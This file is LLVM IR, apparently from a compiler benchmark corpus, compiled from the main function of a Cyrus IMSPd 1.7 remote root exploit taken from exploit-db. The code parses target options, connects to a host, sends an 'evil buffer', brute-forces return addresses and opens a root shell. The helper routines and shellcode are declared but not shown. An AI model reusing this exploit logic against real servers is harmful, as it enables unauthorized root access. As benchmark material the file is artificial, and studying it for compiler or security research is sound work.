; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_139.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_139.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64, i32 }

@DEFAULT_PORT = common dso_local global i32 0, align 4
@DEFAULT_START_ADDRESS = common dso_local global i32 0, align 4
@ROOT_PORT = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [56 x i8] c"\0A==[ Cyrus IMSPd 1.7 Remote Root Exploit bY SpikE ]==\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"h:t:p:ba:r:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = external dso_local global i8*, align 8
@BRUTEFORCE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [6 x i8] c"0x%lx\00", align 1
@Targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.3 = private unnamed_addr constant [27 x i8] c"*** Target plataform : %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"*** Target host : %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [22 x i8] c"*** Target port : %u\0A\00", align 1
@.str.6 = private unnamed_addr constant [23 x i8] c"*** Bind to port : %u\0A\00", align 1
@.str.7 = private unnamed_addr constant [26 x i8] c"*** Target RET : %#010x\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [37 x i8] c"*** Bruteforce mode start : %#010x\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [18 x i8] c"Could not connect\00", align 1
@.str.10 = private unnamed_addr constant [15 x i8] c"[+] Connected\0A\00", align 1
@.str.11 = private unnamed_addr constant [26 x i8] c"[+] Creating evil buffer\0A\00", align 1
@.str.12 = private unnamed_addr constant [25 x i8] c"[+] Sending evil buffer\0A\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.14 = private unnamed_addr constant [19 x i8] c"[+] Verifying ...\0A\00", align 1
@.str.15 = private unnamed_addr constant [32 x i8] c"[+] Yeap.. It is a root shell\0A\0A\00", align 1
@.str.16 = private unnamed_addr constant [31 x i8] c"No root shell. Maybe next time\00", align 1
@.str.17 = private unnamed_addr constant [28 x i8] c"[+] Using RetAddr = %#010x\0A\00", align 1
@.str.18 = private unnamed_addr constant [36 x i8] c"[+] Could not connect. Waiting...\0A\0A\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %7, align 8
  %17 = load i32, i32* @DEFAULT_PORT, align 4
  store i32 %17, i32* %8, align 4
  store i32 0, i32* %9, align 4
  %18 = load i32, i32* @DEFAULT_START_ADDRESS, align 4
  store i32 %18, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %19 = load i32, i32* @ROOT_PORT, align 4
  store i32 %19, i32* %16, align 4
  %20 = load i32, i32* @stdout, align 4
  %21 = call i32 (i32, i8*, ...) @fprintf(i32 %20, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str, i64 0, i64 0))
  br label %22

22:                                               ; preds = %95, %2
  %23 = load i32, i32* %4, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = call signext i8 @getopt(i32 %23, i8** %24, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0))
  store i8 %25, i8* %6, align 1
  %26 = sext i8 %25 to i32
  %27 = load i8, i8* @EOF, align 1
  %28 = sext i8 %27 to i32
  %29 = icmp ne i32 %26, %28
  br i1 %29, label %30, label %96

30:                                               ; preds = %22
  %31 = load i8, i8* %6, align 1
  %32 = sext i8 %31 to i32
  switch i32 %32, label %90 [
    i32 114, label %33
    i32 104, label %44
    i32 112, label %46
    i32 98, label %57
    i32 97, label %68
    i32 116, label %78
  ]

33:                                               ; preds = %30
  %34 = load i8*, i8** @optarg, align 8
  %35 = call i32 @atoi(i8* %34)
  store i32 %35, i32* %16, align 4
  %36 = load i32, i32* %16, align 4
  %37 = icmp ne i32 %36, 0
  br i1 %37, label %43, label %38

38:                                               ; preds = %33
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @Usage(i8* %41)
  br label %43

43:                                               ; preds = %38, %33
  br label %95

44:                                               ; preds = %30
  %45 = load i8*, i8** @optarg, align 8
  store i8* %45, i8** %7, align 8
  br label %95

46:                                               ; preds = %30
  %47 = load i8*, i8** @optarg, align 8
  %48 = call i32 @atoi(i8* %47)
  store i32 %48, i32* %8, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %56, label %51

51:                                               ; preds = %46
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 0
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @Usage(i8* %54)
  br label %56

56:                                               ; preds = %51, %46
  br label %95

57:                                               ; preds = %30
  %58 = load i32, i32* %9, align 4
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %60, label %62

60:                                               ; preds = %57
  %61 = load i32, i32* @BRUTEFORCE, align 4
  store i32 %61, i32* %9, align 4
  br label %67

62:                                               ; preds = %57
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 0
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @Usage(i8* %65)
  br label %67

67:                                               ; preds = %62, %60
  br label %95

68:                                               ; preds = %30
  %69 = load i8*, i8** @optarg, align 8
  %70 = call i32 @sscanf(i8* %69, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i32* %10)
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %77

72:                                               ; preds = %68
  %73 = load i8**, i8*** %5, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 0
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @Usage(i8* %75)
  br label %77

77:                                               ; preds = %72, %68
  br label %95

78:                                               ; preds = %30
  %79 = load i8*, i8** @optarg, align 8
  %80 = call i32 @atoi(i8* %79)
  store i32 %80, i32* %11, align 4
  %81 = load i32, i32* %9, align 4
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %84

83:                                               ; preds = %78
  store i32 128, i32* %9, align 4
  br label %89

84:                                               ; preds = %78
  %85 = load i8**, i8*** %5, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 0
  %87 = load i8*, i8** %86, align 8
  %88 = call i32 @Usage(i8* %87)
  br label %89

89:                                               ; preds = %84, %83
  br label %95

90:                                               ; preds = %30
  %91 = load i8**, i8*** %5, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 0
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @Usage(i8* %93)
  br label %95

95:                                               ; preds = %90, %89, %77, %67, %56, %44, %43
  br label %22

96:                                               ; preds = %22
  %97 = load i8*, i8** %7, align 8
  %98 = icmp eq i8* %97, null
  br i1 %98, label %102, label %99

99:                                               ; preds = %96
  %100 = load i32, i32* %9, align 4
  %101 = icmp eq i32 %100, 0
  br i1 %101, label %102, label %107

102:                                              ; preds = %99, %96
  %103 = load i8**, i8*** %5, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 0
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @Usage(i8* %105)
  br label %107

107:                                              ; preds = %102, %99
  store i32 0, i32* %14, align 4
  br label %108

108:                                              ; preds = %118, %107
  %109 = load %struct.TYPE_2__*, %struct.TYPE_2__** @Targets, align 8
  %110 = load i32, i32* %14, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %109, i64 %111
  %113 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %112, i32 0, i32 0
  %114 = load i64, i64* %113, align 8
  %115 = icmp eq i64 %114, 0
  br i1 %115, label %116, label %117

116:                                              ; preds = %108
  br label %121

117:                                              ; preds = %108
  br label %118

118:                                              ; preds = %117
  %119 = load i32, i32* %14, align 4
  %120 = add nsw i32 %119, 1
  store i32 %120, i32* %14, align 4
  br label %108

121:                                              ; preds = %116
  %122 = load i32, i32* %14, align 4
  %123 = add nsw i32 %122, -1
  store i32 %123, i32* %14, align 4
  %124 = load i32, i32* %11, align 4
  %125 = icmp slt i32 %123, %124
  br i1 %125, label %126, label %131

126:                                              ; preds = %121
  %127 = load i8**, i8*** %5, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 0
  %129 = load i8*, i8** %128, align 8
  %130 = call i32 @Usage(i8* %129)
  br label %131

131:                                              ; preds = %126, %121
  %132 = load i32, i32* %9, align 4
  %133 = icmp eq i32 %132, 128
  br i1 %133, label %134, label %143

134:                                              ; preds = %131
  %135 = load i32, i32* @stdout, align 4
  %136 = load %struct.TYPE_2__*, %struct.TYPE_2__** @Targets, align 8
  %137 = load i32, i32* %11, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %136, i64 %138
  %140 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %139, i32 0, i32 0
  %141 = load i64, i64* %140, align 8
  %142 = call i32 (i32, i8*, ...) @fprintf(i32 %135, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0), i64 %141)
  br label %143

143:                                              ; preds = %134, %131
  %144 = load i32, i32* @stdout, align 4
  %145 = load i8*, i8** %7, align 8
  %146 = call i32 (i32, i8*, ...) @fprintf(i32 %144, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0), i8* %145)
  %147 = load i32, i32* @stdout, align 4
  %148 = load i32, i32* %8, align 4
  %149 = call i32 (i32, i8*, ...) @fprintf(i32 %147, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0), i32 %148)
  %150 = load i32, i32* @stdout, align 4
  %151 = load i32, i32* %16, align 4
  %152 = call i32 (i32, i8*, ...) @fprintf(i32 %150, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.6, i64 0, i64 0), i32 %151)
  %153 = load i32, i32* %9, align 4
  %154 = icmp eq i32 %153, 128
  br i1 %154, label %155, label %164

155:                                              ; preds = %143
  %156 = load i32, i32* @stdout, align 4
  %157 = load %struct.TYPE_2__*, %struct.TYPE_2__** @Targets, align 8
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %157, i64 %159
  %161 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %160, i32 0, i32 1
  %162 = load i32, i32* %161, align 8
  %163 = call i32 (i32, i8*, ...) @fprintf(i32 %156, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.7, i64 0, i64 0), i32 %162)
  br label %168

164:                                              ; preds = %143
  %165 = load i32, i32* @stdout, align 4
  %166 = load i32, i32* %10, align 4
  %167 = call i32 (i32, i8*, ...) @fprintf(i32 %165, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.8, i64 0, i64 0), i32 %166)
  br label %168

168:                                              ; preds = %164, %155
  %169 = load i32, i32* %9, align 4
  switch i32 %169, label %223 [
    i32 128, label %170
  ]

170:                                              ; preds = %168
  %171 = load i8*, i8** %7, align 8
  %172 = load i32, i32* %8, align 4
  %173 = call i32 @ConectToHost(i8* %171, i32 %172)
  store i32 %173, i32* %12, align 4
  %174 = load i32, i32* %12, align 4
  %175 = icmp eq i32 %174, -1
  br i1 %175, label %176, label %178

176:                                              ; preds = %170
  %177 = call i32 @fatal(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0))
  br label %181

178:                                              ; preds = %170
  %179 = load i32, i32* @stdout, align 4
  %180 = call i32 (i32, i8*, ...) @fprintf(i32 %179, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.10, i64 0, i64 0))
  br label %181

181:                                              ; preds = %178, %176
  %182 = load i32, i32* @stdout, align 4
  %183 = call i32 (i32, i8*, ...) @fprintf(i32 %182, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0))
  %184 = load %struct.TYPE_2__*, %struct.TYPE_2__** @Targets, align 8
  %185 = load i32, i32* %11, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %184, i64 %186
  %188 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %187, i32 0, i32 1
  %189 = load i32, i32* %188, align 8
  %190 = load i32, i32* %16, align 4
  %191 = call i8* @CreateEvilBuffer(i32 %189, i32 %190)
  store i8* %191, i8** %15, align 8
  %192 = load i32, i32* @stdout, align 4
  %193 = call i32 (i32, i8*, ...) @fprintf(i32 %192, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i64 0, i64 0))
  %194 = call i32 @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0), i32* %14)
  %195 = load i32, i32* %12, align 4
  %196 = load i8*, i8** %15, align 8
  %197 = load i8*, i8** %15, align 8
  %198 = call i32 @strlen(i8* %197)
  %199 = call i32 @send(i32 %195, i8* %196, i32 %198, i32 0)
  %200 = call i32 @sleep(i32 1)
  %201 = load i32, i32* @stdout, align 4
  %202 = call i32 (i32, i8*, ...) @fprintf(i32 %201, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.14, i64 0, i64 0))
  %203 = call i32 @sleep(i32 1)
  %204 = load i8*, i8** %7, align 8
  %205 = load i32, i32* %16, align 4
  %206 = call i32 @VerifyXpl(i8* %204, i32 %205)
  store i32 %206, i32* %13, align 4
  %207 = icmp sge i32 %206, 0
  br i1 %207, label %208, label %220

208:                                              ; preds = %181
  %209 = load i32, i32* %12, align 4
  %210 = call i32 @close(i32 %209)
  %211 = load i8*, i8** %15, align 8
  %212 = call i32 @free(i8* %211)
  %213 = load i32, i32* @stdout, align 4
  %214 = call i32 (i32, i8*, ...) @fprintf(i32 %213, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.15, i64 0, i64 0))
  %215 = load i32, i32* %13, align 4
  %216 = call i32 @doHack(i32 %215)
  %217 = load i32, i32* %13, align 4
  %218 = call i32 @close(i32 %217)
  %219 = call i32 @exit(i32 0) #3
  unreachable

220:                                              ; preds = %181
  %221 = call i32 @fatal(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.16, i64 0, i64 0))
  br label %222

222:                                              ; preds = %220
  br label %282

223:                                              ; preds = %168
  br label %224

224:                                              ; preds = %281, %223
  %225 = load i32, i32* @stdout, align 4
  %226 = load i32, i32* %10, align 4
  %227 = call i32 (i32, i8*, ...) @fprintf(i32 %225, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.17, i64 0, i64 0), i32 %226)
  %228 = load i8*, i8** %7, align 8
  %229 = load i32, i32* %8, align 4
  %230 = call i32 @ConectToHost(i8* %228, i32 %229)
  store i32 %230, i32* %12, align 4
  %231 = load i32, i32* %12, align 4
  %232 = icmp eq i32 %231, -1
  br i1 %232, label %233, label %237

233:                                              ; preds = %224
  %234 = load i32, i32* @stdout, align 4
  %235 = call i32 (i32, i8*, ...) @fprintf(i32 %234, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.18, i64 0, i64 0))
  %236 = call i32 @sleep(i32 120)
  br label %281

237:                                              ; preds = %224
  %238 = load i32, i32* @stdout, align 4
  %239 = call i32 (i32, i8*, ...) @fprintf(i32 %238, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.10, i64 0, i64 0))
  %240 = load i32, i32* @stdout, align 4
  %241 = call i32 (i32, i8*, ...) @fprintf(i32 %240, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0))
  %242 = load i32, i32* %10, align 4
  %243 = load i32, i32* %16, align 4
  %244 = call i8* @CreateEvilBuffer(i32 %242, i32 %243)
  store i8* %244, i8** %15, align 8
  %245 = load i32, i32* @stdout, align 4
  %246 = call i32 (i32, i8*, ...) @fprintf(i32 %245, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i64 0, i64 0))
  %247 = load i32, i32* %12, align 4
  %248 = load i8*, i8** %15, align 8
  %249 = load i8*, i8** %15, align 8
  %250 = call i32 @strlen(i8* %249)
  %251 = call i32 @send(i32 %247, i8* %248, i32 %250, i32 0)
  %252 = call i32 @sleep(i32 1)
  %253 = load i32, i32* @stdout, align 4
  %254 = call i32 (i32, i8*, ...) @fprintf(i32 %253, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.14, i64 0, i64 0))
  %255 = call i32 @sleep(i32 1)
  %256 = load i8*, i8** %7, align 8
  %257 = load i32, i32* %16, align 4
  %258 = call i32 @VerifyXpl(i8* %256, i32 %257)
  store i32 %258, i32* %13, align 4
  %259 = icmp sge i32 %258, 0
  br i1 %259, label %260, label %272

260:                                              ; preds = %237
  %261 = load i32, i32* %12, align 4
  %262 = call i32 @close(i32 %261)
  %263 = load i8*, i8** %15, align 8
  %264 = call i32 @free(i8* %263)
  %265 = load i32, i32* @stdout, align 4
  %266 = call i32 (i32, i8*, ...) @fprintf(i32 %265, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.15, i64 0, i64 0))
  %267 = load i32, i32* %13, align 4
  %268 = call i32 @doHack(i32 %267)
  %269 = load i32, i32* %13, align 4
  %270 = call i32 @close(i32 %269)
  %271 = call i32 @exit(i32 0) #3
  unreachable

272:                                              ; preds = %237
  %273 = load i32, i32* %12, align 4
  %274 = call i32 @close(i32 %273)
  %275 = load i8*, i8** %15, align 8
  %276 = call i32 @free(i8* %275)
  %277 = load i32, i32* @stdout, align 4
  %278 = call i32 (i32, i8*, ...) @fprintf(i32 %277, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  %279 = load i32, i32* %10, align 4
  %280 = call i32 @GetNextAddr(i32 %279)
  store i32 %280, i32* %10, align 4
  br label %281

281:                                              ; preds = %272, %233
  br label %224

282:                                              ; preds = %222
  %283 = load i8*, i8** %15, align 8
  %284 = call i32 @free(i8* %283)
  %285 = load i32, i32* %12, align 4
  %286 = call i32 @close(i32 %285)
  %287 = load i32, i32* %3, align 4
  ret i32 %287
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @Usage(i8*) #1

declare dso_local i32 @sscanf(i8*, i8*, i32*) #1

declare dso_local i32 @ConectToHost(i8*, i32) #1

declare dso_local i32 @fatal(i8*) #1

declare dso_local i8* @CreateEvilBuffer(i32, i32) #1

declare dso_local i32 @scanf(i8*, i32*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @VerifyXpl(i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @doHack(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @GetNextAddr(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
